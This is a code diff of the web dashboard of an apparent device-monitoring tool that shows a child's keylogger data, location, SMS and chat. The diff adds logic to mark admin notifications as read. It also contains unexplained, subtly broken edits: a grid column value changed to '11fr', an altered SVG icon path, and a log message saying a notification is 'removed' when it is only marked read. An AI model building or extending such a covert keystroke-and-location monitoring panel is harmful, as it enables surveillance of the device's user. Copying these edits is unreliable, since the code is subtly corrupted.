@@ -162,7 +162,7 @@
         #details-view { display: none; animation: fadeIn 0.8s ease; }
         .category-buttons {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(160px, 11fr));
             gap: 2rem;
             margin-bottom: 3rem;
         }
@@ -606,7 +606,7 @@
             </div>
             <div class="modal-body">
                 <p id="admin-notification-text" style="font-size: 1.1rem; line-height: 1.6;"></p>
-                <button class="ok-btn">Okay</button>
+                <button id="admin-notification-ok-btn" class="ok-btn">Okay</button> <!-- Added ID here -->
             </div>
         </div>
     </div>
@@ -666,6 +666,7 @@
         const offlineBanner = document.getElementById('offline-banner');
         const adminNotificationModal = document.getElementById('admin-notification-modal');
         const adminNotificationText = document.getElementById('admin-notification-text');
+        const adminNotificationOkBtn = document.getElementById('admin-notification-ok-btn'); // New: Get the OK button
         const liveChatBtn = document.getElementById('live-chat-btn');
         const chatModal = document.getElementById('chat-modal');
         const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');
@@ -675,6 +676,7 @@
         let activeNotificationListener = null;
         let activeChatListener = null;
         let selectedChildInfo = {};
+        let currentNotificationRef = null; // New: To store the reference of the current notification
 
         // Keylogger Pagination Variables
         let fullKeyloggerData = [];
@@ -839,7 +841,7 @@
                 case 'location':
                     const loc = data; let mapLink = '';
                     if (loc.latitude && loc.longitude) { mapLink = `<a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;}
-                    contentHTML = `<div class="data-card location-card"><div class="data-card-body"><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div><strong>Address:</strong><br>${loc.address || 'N/A'}</div></div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div><strong>Time:</strong><br>${loc.dateTime || 'N/A'}</div></div>${mapLink}</div></div>`;
+                    contentHTML = `<div class="data-card location-card"><div class="data-card-body"><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-9-6-9-13a9 9 0 0 1 18 0Z"/><circle cx="12" cy="10" r="3"/></svg><div><strong>Address:</strong><br>${loc.address || 'N/A'}</div></div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div><strong>Time:</strong><br>${loc.dateTime || 'N/A'}</div></div>${mapLink}</div></div>`;
                     break;
                 case 'sms':
                     contentHTML = '<div class="data-list">';
@@ -903,6 +905,10 @@
                     if (activeChatListener && activeChatListener.ref) { off(activeChatListener.ref); activeChatListener = null; }
                     document.getElementById('chat-send-btn').onclick = null;
                     document.getElementById('chat-message-input').onkeypress = null;
+                }
+                // New: Clear currentNotificationRef when admin notification modal is closed
+                if (modalId === 'admin-notification-modal') {
+                    currentNotificationRef = null;
                 }
             }, 300);
         }
@@ -976,6 +982,27 @@
         
         document.body.addEventListener('click', function(e) {
             const target = e.target;
+            // New: Check if the clicked element is the admin notification OK button
+            if (target === adminNotificationOkBtn) {
+                if (currentNotificationRef) {
+                    // Update the 'read' status to true
+                    update(currentNotificationRef, { read: true })
+                        .then(() => {
+                            console.log("Notification marked as read and removed from Firebase.");
+                            closeModal(adminNotificationModal); // Close the modal after updating
+                        })
+                        .catch((error) => {
+                            console.error("Error marking notification as read:", error);
+                            // Optionally, show an error to the user
+                            showToast("Error marking notification as read.");
+                            closeModal(adminNotificationModal); // Still close the modal to avoid loop
+                        });
+                } else {
+                    closeModal(adminNotificationModal); // If no currentNotificationRef, just close
+                }
+                return; // Prevent further processing by the generic modal close logic
+            }
+
             if (target.classList.contains('modal-overlay') || target.closest('.modal-close-btn') || target.closest('.ok-btn')) {
                 const modalToClose = target.closest('.modal-overlay');
                 closeModal(modalToClose);
@@ -997,10 +1024,19 @@
             const notificationsQuery = query(ref(db, notificationsPath), orderByChild('read'), equalTo(false));
             activeNotificationListener = { ref: notificationsQuery };
             onValue(notificationsQuery, (snapshot) => {
-                snapshot.forEach((childSnapshot) => {
-                    adminNotificationText.textContent = childSnapshot.val().message; 
-                    openModal(adminNotificationModal);
-                });
+                // Ensure we only process new, unread notifications
+                if (snapshot.exists()) {
+                    snapshot.forEach((childSnapshot) => {
+                        const notificationData = childSnapshot.val();
+                        // Only show if it's explicitly marked as unread or if 'read' property doesn't exist
+                        if (notificationData.read === false || notificationData.read === undefined) {
+                            adminNotificationText.textContent = notificationData.message; 
+                            openModal(adminNotificationModal);
+                            // Store the reference to the current notification that is being displayed
+                            currentNotificationRef = childSnapshot.ref; 
+                        }
+                    });
+                }
             });
         }
     </script>
